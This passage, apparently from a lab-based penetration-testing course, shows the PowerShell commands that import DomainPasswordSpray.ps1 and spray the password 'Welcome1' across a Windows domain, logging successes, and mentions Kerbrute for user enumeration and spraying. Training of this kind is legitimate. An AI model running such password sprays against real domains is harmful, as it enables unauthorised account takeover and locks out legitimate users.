#### Using DomainPasswordSpray.ps1

	PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
	PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

We could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section. The tool is present in the `C:\Tools` directory if you wish to work through the same examples from the provided Windows host.


